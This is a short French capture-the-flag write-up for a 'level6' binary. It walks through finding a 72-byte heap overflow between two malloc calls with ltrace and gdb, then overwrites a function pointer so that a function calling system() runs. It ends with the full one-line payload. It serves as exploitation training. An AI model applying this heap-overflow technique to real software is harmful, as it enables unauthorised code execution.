Le programme segfault sans argument car il essaye de strcpy un \0
On a un Main qui a un appel de la fonction M qui ne sert a rien mais on remarque une fonction N qui appel un system() c'est donc elle qui'il va falloir executer

Quand on disassamble le main on voit que y'a 2 malloc ( donc potentiel overflow)

ltrace ./level6 test

y'a 2 malloc : 1 de 64 et 1 de 4

c'est le malloc numero 2 qui appel le fonction N
<!--
on va trouver la memoire alloue dans la heap pour savoir au bout de combien d'octet on ecrase la malloc 2
avec comme adresse 0x0804a008 (64) vs 0x0804a050 (4)
si on fait 0x0804a050 - 0x0804a008 = 0x48 = 72 en decimal
on sait donc qu'il a 72 bytes qui separe le malloc 1 et 2 (car ils sont alloues en meme temps) -->

gdb level6

run (avec pattern : https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

en essayant on voit que ca segfault a 72 on va donc faire comme les autres flag

sauf que vu que le programme segfault a cause du strcpy on rajoute le python en argument de l'executable en lui donnant l'adresse decale de 72

info functions -> on voit l'adresse de "n" = 0x08048454 (donc : \x54\x84\x04\x08 en little-endian)

./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')